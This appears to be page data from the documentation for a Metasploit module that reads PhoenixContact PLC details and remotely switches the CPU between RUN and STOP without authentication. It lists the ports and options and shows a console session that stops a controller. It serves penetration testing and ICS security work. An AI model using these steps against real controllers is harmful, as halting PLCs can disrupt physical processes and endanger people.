{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/admin/scada/phoenix_command","result":{"data":{"moduleMetadataJson":{"id":"d6099c3f-3303-5370-b1af-92a698caf3c3","name":"PhoenixContact PLC Remote START/STOP Command","fullname":"auxiliary/admin/scada/phoenix_command","description":"PhoenixContact Programmable Logic Controllers are built upon a variant of\n        ProConOS. Communicating using a proprietary protocol over ports TCP/1962\n        and TCP/41100 or TCP/20547.\n        It allows a remote user to read out the PLC Type, Firmware and\n         Build number on port TCP/1962.\n        And also to read out the CPU State (Running or Stopped) AND start\n         or stop the CPU on port TCP/41100 (confirmed ILC 15x and 17x series)\n         or on port TCP/20547 (confirmed ILC 39x series)","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/admin/scada/phoenix_command","documentationSlug":"/modules/documentation/auxiliary/admin/scada/phoenix_command"},"documentation":{"html":"<p>PhoenixContact Programmable Logic Controllers are built are using a variant of\nProConOS. The communicate using a proprietary protocol over ports TCP/1962 and\nTCP/41100 or TCP/20547.  This protocol allows a user to remotely determine the\nPLC type, firmware and build number on port TCP/1962.  A user can also\ndetermine the CPU State (Running or Stopped) and start or stop the CPU.</p>\n<p>This functionality is confirmed for the PLC series ILC 15x and 17x on TCP port\n20547, and for the ILC 39x series on TCP port 41100. Other series may or\nmay not work, but there is a good chance that they will</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This is a hardware zero-day vulnerability that CANNOT be patched. Possible\nmitigations include: pulling the plug (literally), using network isolation\n(Firewall, Router, IDS, IPS, network segmentation, etc...) or not allowing bad\npeople on your network.</p>\n<p>Most, if not all, PLC's (computers that control engines, robots, conveyor\nbelts, sensors, camera's, doorlocks, CRACs ...) have vulnerabilities where,\nusing their own tools, remote configuration and programming can be done\n<em>WITHOUT</em> authentication.  Investigators and underground hackers are just now\ncreating simple tools to convert the, often proprietary, protocols into simple\nscripts.  The operating word here is proprietary. Right now, the only thing\nstopping very bad stuff from happening.  PhoenixContact uses an (unnamed?)\nlow-level protocol for connection, information exchange and configuration of\nits PLC devices.  This script utilizes that protocol for finding information\nand switching the PLC mode from STOP to RUN and vice-versa.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>The following demonstrates a basic scenario, we \"found\" two devices with an open port TCP/1962:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; search phoenix\nmsf &gt; use auxiliary/admin/scada/phoenix_command\nmsf auxiliary(phoenix_command) &gt; set RHOST 10.66.56.12\nRHOST =&gt; 10.66.56.12\nmsf auxiliary(phoenix_command) &gt; run\n\n[*] 10.66.56.12:0 - PLC Type = ILC 150 GSM/GPRS\n[*] 10.66.56.12:0 - Firmware = 3.71\n[*] 10.66.56.12:0 - Build    = 07/13/11 12:00:00\n[*] 10.66.56.12:0 - ------------------------------------\n[*] 10.66.56.12:0 - --&gt; Detected 15x/17x series, getting current CPU state:\n[*] 10.66.56.12:0 - CPU Mode = RUN\n[*] 10.66.56.12:0 - ------------------------------------\n[*] 10.66.56.12:0 - --&gt; No action specified (NOOP), stopping here\n[*] Auxiliary module execution completed\n\nmsf auxiliary(phoenix_command) &gt; set RHOST 10.66.56.72\nRHOST =&gt; 10.66.56.72\nmsf auxiliary(phoenix_command) &gt; set ACTION REV\nACTION =&gt; REV\nmsf auxiliary(phoenix_command) &gt; run\n[*] 10.66.56.72:0 - PLC Type = ILC 390 PN 2TX-IB\n[*] 10.66.56.72:0 - Firmware = 3.95\n[*] 10.66.56.72:0 - Build    = 02/14/11 14:04:47\n[*] 10.66.56.72:0 - ------------------------------------\n[*] 10.66.56.72:0 - --&gt; Detected 39x series, getting current CPU state:\n[*] 10.66.56.72:0 - CPU Mode = RUN\n[*] 10.66.56.72:0 - ------------------------------------\n[*] 10.66.56.72:0 - --&gt; Sending STOP now\n[*] 10.66.56.72:0 - CPU Mode = STOP\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(phoenix_command) &gt; show options\n\nModule options (auxiliary/admin/scada/phoenix_command):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   ACTION     NOOP             yes       PLC CPU action, REV means reverse state (Accepted: STOP, START, REV, NOOP)\n   RHOST                       yes       The target address\n   RINFOPORT  1962             yes       Set info port\n   RPORT                       no        Set action port, will try autodetect when not set</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>By default, the module only reads out the PLC Type, Firmware version, Build\ndate and current CPU mode (RUNing or STOPed)</p>\n<p>The first three pieces of data (Type, Firmware &#x26; Build) are always found on\nport TCP/1962 (there is no way of changing that port on the PLC, so also no\nreason to change the 'RINFOPORT' option)</p>\n<p>The CPU mode uses a TCP port depending on the PLC Type, the module will\nautomatically detect the type and port to use, but can be overridden with the\n'RPORT' option, however no real reason to configure it. If you accidentally set RPORT, you can unset it with the <code class=\"language-text\">unset RPORT</code> command.</p>\n<p><strong>The ACTION option</strong></p>\n<p>Action has four possible values:</p>\n<p>By default, the module will do nothing to the PLC, therefore No Operation or 'NOOP':</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(phoenix_command) &gt; set ACTION NOOP</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>The PLC can be forced to go into STOP mode, meaning it stops all execution and all outputs are set to low:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(phoenix_command) &gt; set ACTION STOP</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>The PLC can be forced to go into RUN mode, where it keeps running it was or it will start executing its current boot programming:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(phoenix_command) &gt; set ACTION START</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>The module can also just read out the CPU mode and then reverse whatever it finds, RUN becomes STOP, STOP becomes RUN:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(phoenix_command) &gt; set ACTION REV</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>"}}},"pageContext":{"id":"d6099c3f-3303-5370-b1af-92a698caf3c3"}}}